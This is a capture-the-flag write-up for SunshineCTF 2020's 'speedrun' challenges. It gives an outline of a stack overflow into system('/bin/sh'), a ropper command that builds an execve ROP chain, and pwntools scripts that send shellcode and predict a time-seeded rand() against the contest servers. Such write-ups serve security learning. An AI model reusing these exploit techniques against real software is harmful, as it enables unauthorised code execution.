# Speedrun series

**Category**: Binary exploitation, reverse engineering \
**Points**: 10 - 50 \
**Author**: guyinatuxedo

I'd like to say that [datajerk](https://github.com/datajerk) has already
written some nice write-ups for these challenges
[here](https://github.com/datajerk/ctf-write-ups/blob/master/sunshinectf2020/speedrun/README.md)
(and he solved these challenges much more cleanly than I did), so I'll only
explain things he hasn't already covered.

## speedrun-02

I didn't notice there was already a `win` function that called
`system('/bin/sh')`, so instead I called `system()` directly. To do this, I had
to do the following:
- Overflow stack with garbage
- Overwrite return address to `system()`
- Put a fake return address onto the stack
- Put a pointer to the `'/bin/sh'` string onto the stack to serve as an argument

## speedrun-08

Payload
```
-11
6294000
```

## speedrun-14

I more or less exactly followed this guide: https://quentinmeffre.fr/pwn/2017/01/25/easy_method.html.
However, datajerk has a much better solution:
```bash
ropper --file chall_14 --chain "execve cmd=/bin/sh" --badbytes 0a
```

## speedrun-15

For this challenge my solution script was simpler than datajerk's. For some
reason `shellcraft.sh()` didn't work (probably because it was too long?), so I
just used `shellcraft.cat('flag.txt')` instead.

```python
from pwn import *

context.arch = 'amd64'

sh = remote('chal.2020.sunshinectf.org', 30015)

sh.sendline('abc')
s = sh.recvline().decode('ascii').split()
buf = int(s[-1], 0)
print('buf:', hex(buf))

ret_addr_padding = 78

p = asm(shellcraft.cat('flag.txt')).ljust(66, asm('nop'))
p += p32(0xfacade)
p = p.ljust(ret_addr_padding, b'Z')
p += p64(buf)

sh.sendline(p)
print(sh.recvallS(timeout=2))
```

## speedrun-16

For some reason the Ghidra decompilation that datajerk showed eliminated the
huge sequence of XORs on the input value:
```
0x000055555555484d <+112>:	xor    DWORD PTR [rbp-0x54],0x30
0x0000555555554851 <+116>:	xor    DWORD PTR [rbp-0x54],0x31
0x0000555555554855 <+120>:	xor    DWORD PTR [rbp-0x54],0x32
0x0000555555554859 <+124>:	xor    DWORD PTR [rbp-0x54],0x33
...
0x0000555555554a04 <+551>:	xor    DWORD PTR [rbp-0x54],0x91
0x0000555555554a0b <+558>:	xor    DWORD PTR [rbp-0x54],0x92
0x0000555555554a12 <+565>:	xor    DWORD PTR [rbp-0x54],0x93
```

I reversed this with:
```python
def fuck(x):
    x = ord(x)
    for i in range(0x30, 0x94):
        x = x ^ i
    return chr(x)
```

This magically returned the same `x` value. Changing `0x30` or `0x94` messed
this up completely however.

## speedrun-17

I wasn't aware that you could call C functions directly from a Python script, so
I wrote a separate program that returned the desired value. I then used the
`subprocess` module to get this value from my Python script.

```c
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

int main(int argc, char *argv[])
{
    time_t t = time(0);
    srand(t);
    printf("%d\n", rand());
    return 0;
}
```

```python
from pwn import *
import subprocess

sh = remote('chal.2020.sunshinectf.org', 30017)
# sh = process('./chall_17')

sub_ans = subprocess.check_output('./a.out')
p = sub_ans.decode().strip()
print(p)

sh.sendline(p)
print(sh.recvall())
```
